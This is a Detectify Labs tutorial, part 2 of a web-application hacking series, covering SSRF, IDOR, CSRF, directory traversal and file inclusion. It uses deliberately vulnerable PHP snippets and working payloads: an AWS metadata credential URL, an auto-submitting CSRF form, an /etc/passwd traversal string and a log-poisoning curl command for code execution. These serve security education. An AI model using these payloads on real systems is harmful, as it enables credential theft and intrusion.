---
source: detectify
source_url: https://labs.detectify.com/how-to/hack-web-applications-in-2022-part-2/
title: "How To Hack Web Applications in 2022: Part 2 - Labs Detectify"
author: "Detectify"
published: 2022-08-05T14:20:00+00:00
description: "From business logic vulnerabilities to server-side request forgery, ethical hacker details how you can hack web applications in simple steps"
---

[Home](https://labs.detectify.com/)/ [How to](https://labs.detectify.com/category/how-to/)/ [How To Hack Web Applications in 2022: Part 2](https://labs.detectify.com/how-to/hack-web-applications-in-2022-part-2/)

[How to](https://labs.detectify.com/category/how-to/ "How to")

# How To Hack Web Applications in 2022: Part 2

![](https://labs.detectify.com/_next/image/?url=https%3A%2F%2Flabsadmin.detectify.com%2Fapp%2Fuploads%2F2021%2F08%2Fhakluke.jpg&w=128&q=75)

**Hakluke** Aug 05, 2022

[hakluke](https://labs.detectify.com/tag/hakluke/ "hakluke")

[Twitter](https://twitter.com/intent/tweet?url=https://labs.detectify.com/how-to/hack-web-applications-in-2022-part-2/ "Share on Twitter") [LinkedIn](https://www.linkedin.com/sharing/share-offsite/?url=https://labs.detectify.com/how-to/hack-web-applications-in-2022-part-2/ "Share on LinkedIn")

![How To Hack Web Applications in 2022: Part 2](https://labs.detectify.com/_next/image/?url=https%3A%2F%2Flabsadmin.detectify.com%2Fapp%2Fuploads%2F2022%2F08%2Fhow-to-hack-web-apps.png&w=3840&q=75)

**TL/DR: Web applications have both authentication and authorization as key concepts and if bypassed by an attacker, it can compromise sensitive data. With threats such as SSRF, business logic vulnerabilities, CSRFs and directory traversals etc, it’s important for security teams to stay ahead of the curve. Ethical hacker Luke ‘ _[Hakluke’](https://www.twitter.com/hakluke)_ Stephens details on how you can hijack web applications before attackers do.**

There’s a decent chance that you found your way here from part 1, but if not: You think you can just waltz in here and pretend like you earned it? The nerve! Go and read [part 1](https://labs.detectify.com/2022/05/16/how-to-hack-web-applications/). So, part one ended abruptly midway through a section outlining different types of web application vulnerabilities. We’re going to continue that right here!

## **Server-Side Request Forgery (SSRF)**

Server-side request forgery occurs when an attacker is able to control (at least in part) the URL of a request that is made from the server. The severity of SSRF vulnerabilities varies greatly depending on a number of factors including:

- How much of the response is viewable by the attacker
- What internal hosts are accessible
- The sensitivity of the information that can be gained

### SSRF Example

Let’s say we have a PHP application that allows you to specify a profile picture. Instead of uploading the image directly, you are able to provide a URL. The server will then fetch that URL and use the response as your profile picture. The underlying code might look something like this:

```
<?php

$url = $_GET['pfpurl'];

$pfp = file_get_contents($url);

header("content-type: image/png");

print $pfp;

?>
```

This code accepts a GET parameter called pfpurl. The application is expecting the value of this parameter to be a URL pointing to a profile picture. As soon as it receives the URL, it will fetch it with the file\_get\_contents() function, and immediately serve the response to the user. The important thing to note is that the server makes the request to grab the image, not the browser.

Let’s try this out – I’ve hosted the script on my local machine on port 5001. I entered the following URL – note that the value of phpurl is an image that is hosted on the Detectify website.

[http://localhost:5001/ssrf.php?pfpurl=https://detectify.com/assets/images/icons/detectify-security-teams.png](http://localhost:5001/ssrf.php?pfpurl=https://detectify.com/assets/images/icons/detectify-security-teams.png)

As expected, the image loads:

![](https://labsadmin.detectify.com/app/uploads/2022/08/image14-2.png)

Although the application is expecting an image, any URL could be accessed. For example, let’s try accessing a Burp collaborator instance:

![](https://labsadmin.detectify.com/app/uploads/2022/08/image2-3.png)

The image looks as though it didn’t actually load, but if we right click and save the image:

![](https://labsadmin.detectify.com/app/uploads/2022/08/image5-3.png)

We can then cat out the image in a terminal, to view the true response from the server:

![](https://labsadmin.detectify.com/app/uploads/2022/08/image1-4.png)

Or, more conveniently, we could use curl to view the response directly:

![](https://labsadmin.detectify.com/app/uploads/2022/08/image1-5.png)

Here’s the thing though – the requests I can make from the web server are not only limited to internet-facing hosts… I could make a request to any server that the vulnerable application has access to, including ones that are on the same internal network. For example, I can access the HTTP response from my router:

![](https://labsadmin.detectify.com/app/uploads/2022/08/image8-3.png)

Often, there are cases where an application is hosted on an internal network that is shared with other sensitive applications that are only meant to be accessed by internal employees. This type of SSRF may be abused to pivot into the internal network and access those applications, using the application’s SSRF vulnerability as a proxy. For the visual learners:

![](https://labsadmin.detectify.com/app/uploads/2022/08/image12-2.png)

### **Cloud Metadata Endpoints**

If you are super observant, you may have noticed that one of the boxes in the diagram above was “Cloud Metadata”. Some cloud providers have API metadata endpoints that are accessible from cloud instances, for example the [AWS metadata endpoint](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html) is located at [http://169.254.159.254](http://169.254.159.254/).

Using a SSRF like this one, you are able to access the AWS metadata endpoint. For example, accessing [http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm/](http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm/) may reveal AWS credentials that can be used to make calls to the AWS API as that IAM role.

### SSRF Further Reading

Detectify released a great blog post about SSRF vulnerabilities back in 2019, you can read it [here](https://blog.detectify.com/2019/01/10/what-is-server-side-request-forgery-ssrf/).

## **Business Logic Vulnerabilities**

Business logic vulnerabilities are one of the most common types that I see in the wild – unfortunately, they are also one of the hardest define by nature. In general, a business logic vulnerability is any vulnerability that allows an attacker to abuse the application to perform things that would normally be restricted due to a requirement by the business.

Some examples may include:

- Skipping the requirement to verify your identity upon signup by simply navigating directly to the dashboard URL.
- Editing the price of objects upon checkout on an e-commerce site to receive items for free.
-  Bypass the daily account transfer limit on a banking application.

### Finding Business Logic Vulnerabilities

It’s difficult to provide a generic guide on how to discover vulnerabilities, because they are dependent on the business purpose of the application. As a general workflow though, an attacker might:

1. Use the application thoroughly to understand its purpose and restrictions
2. Identify which restrictions are in place due to a business requirement
3. Attempt to bypass them, at negative consequence to the business

## **Insecure Direct Object References (IDORs)**

Insecure direct object references are a subset of Authorisation issues, where an attacker is able to access information or functionality that would normally be restricted to them, by referring directly to that functionality or information by its ID.

For example, let’s say there is a web application that automatically generates invoices for businesses. Ideally, a user could only access the invoices that they created, and would not be able to view the invoices that were created by other users.

Viewing the details of an invoice is as easy as accessing:

[https://example.com/invoices/1234](https://example.com/invoices/1234)

In this case, 1234 is the ID of the invoice. Every time a new invoice is created by any user, it is assigned a new ID. The previous invoice that was created is located at [https://example.com/invoices/1233](https://example.com/invoices/1233), and the one before that is located at [https://example.com/invoices/1232](https://example.com/invoices/1232). You get the idea. Of course, as a user if you attempt to access one of these invoices, but it belongs to another user, you should not be able to access it. Rather, it should return a 403 error, or some type of error message.

The vulnerability occurs if an attacker can simply change these numbers and view the invoices of other users.

## **Authentication Issues**

Authentication is the process of identifying _who_ a user is. Any issue with authentication may result in the web application thinking that one user is someone else, which has some pretty serious security implications!

Authentication issues come in many different forms, but they all either weaken or completely bypass the authentication process. Some examples of authentication issues include:

### Brute-Forcible Passwords

In this case, an attacker is able to enter a username of the victim user and then attempt thousands, millions or even billions of passwords with the intention of discovering the correct one. This is achieved through automation.

### Brute-Forcible Usernames

In this case, some functionality in the application (such as the forgot password process) may respond differently when a valid username is entered versus one that doesn’t exist in the system. In this case, a large number of usernames can be sent to the server in order to uncover a list of valid usernames to stage further attacks on – like, perhaps brute-forcing their password.

### Issues With Multi-Factor Authentication Implementations

Another thing that can weaken the security of the authentication process is a weakness in the MFA implementation. For example, the MFA token may be brute-forcible or bypassable through forced browsing.

### Other Authentication Mechanisms

Often you will encounter alternative authentication mechanisms that do not require the traditional username/password. One popular alternative is OAuth2, where a trusted identity provider (IDP) such as Facebook, Github, or Twitter is used to authenticate the user. In this case, access to the third party IDP account is considered proof of identity. OAuth2 flows are quite complex, and are therefore often implemented in ways that introduce security vulnerabilities in the authentication flow. For some additional reading, you can check out [this blog](https://portswigger.net/research/hidden-oauth-attack-vectors) from Portswigger, which outlines some excellent, novel attack vectors for OAuth2.

## **Cross-Site Request Forgery (CSRF)**

Cross-site request forgery (CSRF) occurs when a GET or POST request can be made from a completely different site, causing a state-changing action. For example, let’s say that we have some functionality that allows a user to update their password, as below:

```
<h1>Enter new password</h1>

<form method="POST">

    <input type="password" name="newpass">

    <input type="submit">

</form>

<?php

if (isset($_POST['newpass'])) {

    $currentuser->set_password($_POST['newpass']);

    print("Password update successful.");

}

?>
```

The application will look something like this:

![](https://labsadmin.detectify.com/app/uploads/2022/08/image13-2.png)

In this case, the “newpass” parameter on a POST request is accepted as the user’s new password, and a message is displayed, for example:

![](https://labsadmin.detectify.com/app/uploads/2022/08/image7-2.png)

The problem is that I could post the following code on any website, such as hakluke.com:

```
<html>

  <body>

  <script>history.pushState('', '', '/')</script>

    <form action="http://localhost:5001/csrf.php" method="POST">

      <input type="hidden" name="newpass" value="hacked" />

      <input type="submit" value="Submit request" />

    </form>

    <script>

      document.forms[0].submit();

    </script>

  </body>

</html>
```

In this case, if anyone visited hakluke.com, this would send a POST request to the vulnerable application, and update the unsuspecting victim’s user to “hacked”, without their knowledge.

The best way to mitigate this type of vulnerability is to implement CSRF tokens, more information is available on [OWASP’s website](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html).

## **Directory Traversal**

Directory Traversal occurs when an attacker is able to read arbitrary files on the server by simply supplying a path to that file. For example, let’s say that there is an application that fetches a user’s profile image from the local disk, and prints it to the website. The code might look something like this:

```
<?php

$pfp = file_get_contents("./images/" . $_GET['image']);

header("content-type: image/png");

print($pfp);

?>
```

Used legitimately, the result may look something like this:

![](https://labsadmin.detectify.com/app/uploads/2022/08/image11-1.png)

But what happens if we request the following url?

[http://localhost:5001/directorytraversal.php?image=./../../../../../../../../../../../etc/passwd](http://localhost:5001/directorytraversal.php?image=./../../../../../../../../../../../etc/passwd)

In this case, the application ends up accessing:

/var/www/html/images/./../../../../../../../../../../../etc/passwd

Which ends up just being:

/etc/passwd

Here it is in action! I didn’t show the entire /etc/passwd file because, well, this is my computer.

![](https://labsadmin.detectify.com/app/uploads/2022/08/image6-4.png)

## **File Inclusion (LFI/RFI)**

File inclusion vulnerabilities and directory traversal vulnerabilities are often confused, even by seasoned professionals. File inclusion vulnerabilities include the file _as server-side code_, while directory traversal vulnerabilities allow you to simply read server-side files, but they are not interpreted by the server as code.

File inclusions are typically categorized one of two ways, they are either _local_ or _remote_. This is referring to the location of the file that may be included. Local file inclusions only allow _local_ files to be included, while remote file inclusions allow you to specify a remote file (perhaps hosted on a website that you own).

### Local File Inclusion (LFI)

As an example of LFI, let’s take a look at a way in which a developer might choose to implement a basic router:

<?php

include(“./pages/” . $\_GET\[‘page’\]);

?>

Inside pages, we have three different files: about.php, home.php and contact.php. They can be accessed by adding one of those filenames to the page parameter, for example:

[http://localhost:5001/?page=about.php](http://localhost:5001/?page=about.php)

![](https://labsadmin.detectify.com/app/uploads/2022/08/image9-3.png)

We could use this similarly to a directory traversal by setting the page parameter to ./../../../../../../../etc/passwd, but LFI is typically much more serious, because if we can somehow inject arbitrary PHP code to a file on the web server, we could achieve code execution! How might we inject PHP code into a file? How about… Log files!

You see, user input often makes it into log files, if that user input happens to be PHP code, then we could inject PHP code into the log file, then we can load the log file with our LFI, and the PHP code will execute. To demonstrate, let’s add some logging to our application:

```
<?php

// log ip and user agent

$userAgent = $_SERVER['HTTP_USER_AGENT'];

$ip = $_SERVER['REMOTE_ADDR'];

file_put_contents("/tmp/log.txt", $ip . " " . $userAgent, FILE_APPEND);

// router

include("./pages/" . $_GET['page']);

?>
```

The code above will simply log the user’s IP address and user agent to the log file, which is /tmp/log.txt, then proceed with the router from the previous example. Now, let’s see the attack in action! Firstly we request the PHP file using curl, and we change our User Agent to be some PHP code.

curl http://localhost:5001/lfi.php?page=about.php -H “User-Agent: <?php phpinfo() ?>”

If we take a look at the log file now, we can see that it contains the PHP code!

~$ cat /tmp/log.txt

::1 <?php phpinfo() ?>

Now we can use the LFI in the application to include that log file, which results in the PHP code of our choice being executed!

![](https://labsadmin.detectify.com/app/uploads/2022/08/image3-3.png)

### **Remote File Inclusion (RFI)**

Remote file inclusion has the same impact, but tends to be easier to exploit because you can include remote files, instead of just local files. This means that you can host files on an external website and include them as server-side code directly into the web application you are attacking instead of trying to find a way to inject the code of your choice into logs.

RFI vulnerabilities are quite rare in PHP today because the default configuration of PHP does not allow remote sources to be treated as includable files. In order to have a vulnerable server, the PHP settings file needs to specify:

allow\_url\_include = On

We can then simply host our PHP code of choice in a remote text file. For this example, I’m just hosting it on a different port on my local computer, accessible via [http://localhost:5002/test.txt](http://localhost:5002/test.txt). In that file I have a basic <?php phpinfo() ?>.

Once we’ve set it up, we can simply navigate to [http://localhost:5001/rfi.php?page=http://localhost:5002/test.txt](http://localhost:5001/rfi.php?page=http://localhost:5002/test.txt), and see that the code has been executed successfully!

![](https://labsadmin.detectify.com/app/uploads/2022/08/image4-4.png)

## **What’s Next?**

The information included in these blogs has been the absolute fundamentals of web application hacking. Believe it or not, we have barely scratched the surface! In the next blog part, I hope to explore some newer and more novel web application vulnerabilities.

Be sure to follow Detectify on [Twitter](https://twitter.com/detectify) to know when the next blog drops! I’ll also be sure to post it on [my own Twitter feed](https://twitter.com/hakluke), along with plenty of other hacking tips and tricks!

[Twitter](https://twitter.com/intent/tweet?url=https://labs.detectify.com/how-to/hack-web-applications-in-2022-part-2/ "Share on Twitter") [LinkedIn](https://www.linkedin.com/sharing/share-offsite/?url=https://labs.detectify.com/how-to/hack-web-applications-in-2022-part-2/ "Share on LinkedIn")

![](https://labs.detectify.com/_next/image/?url=https%3A%2F%2Flabsadmin.detectify.com%2Fapp%2Fuploads%2F2021%2F08%2Fhakluke.jpg&w=128&q=75)

**Hakluke**

Owner, Haksec

## Check out more content

External Attack Surface Management (EASM) is the continuous discovery, analysis, and monitoring of an organization’s public facing assets. A substantial part of EASM is the …

January 13, 2023

TL/DR: It’s becoming increasingly easy to compromise sensitive information for attackers to take advantage of. In this post, Detectify security researcher Alfred Berg wrote about …

June 16, 2022

TL/DR: Web applications can be exploited to gain unauthorized access to sensitive data and web servers. Threats include SQL Injection, Code Injection, XSS, Defacement, and …

May 16, 2022

If you don’t know about HTTP/2 request smuggling then what are you hacking? Alfred Berg, Security Researcher at Detectify, shows you how to set up …

August 26, 2021